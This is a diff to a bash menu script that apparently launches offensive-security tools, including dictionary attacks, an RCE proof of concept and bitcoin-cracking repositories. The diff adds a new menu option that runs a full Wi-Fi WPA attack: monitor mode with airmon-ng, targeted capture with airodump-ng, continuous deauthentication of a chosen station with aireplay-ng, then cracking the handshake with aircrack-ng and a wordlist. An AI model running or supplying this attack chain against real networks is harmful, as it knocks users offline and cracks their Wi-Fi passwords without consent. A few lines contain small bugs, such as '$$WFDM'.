@@ -632,6 +632,7 @@ while true; do
 	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\t\t751. RCE with finger\n"
 	echo -ne " 754. get RPC info\t\t\t\t755. get RPC connect\n"
 	echo -ne " 756. smb connection\t757. rlogin dictionary attack\t758. rdesktop dictionary attack\n"
+	echo -ne " 9. wifi WPA with deauth attack\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -718,6 +719,49 @@ while true; do
 	;;
 	"8")
 		Clona "ZecOps/CVE-2020-0796-RCE-POC"
+	;;
+	"9")
+		iwconfig
+		echo "Digit a wifi device"
+		read -p "(example, wlan0): " WFD
+		if [[ "$WFD" != "" ]];
+		then
+			airmon-ng start "$WFD"
+			iwconfig
+			echo "Digit the wifi device in monitor mode"
+			read -p "(example wlan0mon): " WFDM
+			if [[ "$WFDM" != "" ]];
+			then
+				xterm -e airodump-ng "$WFDM" &
+				echo "Digit a channel number"
+				read -p "(example, 11): " CHN
+				if [[ "$CHN" != "" ]];
+				then
+					xterm -e airodump-ng -c "$CHN" "$WFDM" &
+					echo "Digit a target bssid address"
+					read -p "(example, 00:11:22:33:44:55): " BSSD
+					if [[ "$BSSD" != "" ]];
+					then
+						xterm -e airodump-ng -bssid "$BSSD" -c "$CHN" "$WFDM" &
+						echo "Digit a target station for the deauth attack"
+						read -p "(example, 99:88:77:66:55:44): " STN
+						if [[ "$STN" != "" ]];
+						then
+							xterm -e airodump-ng -c "$CHN" -d "$STN" -w capture "$WFDM" &
+							xterm -e aireplay-ng -a "$BSSD" -c "$STN" --deauth 0 "$$WFDM" &
+							read "Attend the WPA handshake completed..."
+							airmon-ng stop "$WFDM"
+							echo "Digit a password wordlist file"
+							read -p "(example, /usr/share/wordlists/rockyou.txt" WRDL
+							if [[ -f "$WRDL" ]];
+							then
+								aircrack-ng capture-*.cap -w "$WRDL"
+							fi
+						fi
+					fi
+				fi
+			fi
+		fi
 	;;
 	"10")
 		if [[ -f $(which lynx) ]];
